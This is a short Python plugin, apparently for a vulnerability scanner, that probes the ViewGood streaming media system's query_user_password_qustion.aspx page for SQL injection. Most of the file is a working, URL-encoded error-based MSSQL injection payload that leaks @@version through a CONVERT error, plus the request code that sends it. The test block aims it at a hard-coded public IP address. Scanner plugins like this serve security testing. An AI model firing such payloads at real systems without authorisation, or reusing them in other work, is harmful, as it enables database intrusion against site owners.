#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 远古流媒体系统  query_user_password_qustion.aspx注入漏洞


def assign(service, arg):
    if service == "viewgood":
        return True, arg

def audit(arg):
    payload ='viewgood/webmedia/portal/query_user_password_qustion.aspx?user_name=1%27%20AND%201%3DCONVERT%28int%2C%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%2b@@version%2b%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%29%20AND%20%271%27%3D%271'
    target = arg + payload 
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 500 and 'tyqMicrosoft SQL Server' in res:
        security_hole(target)
           
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('viewgood', 'http://116.236.137.30/')[1])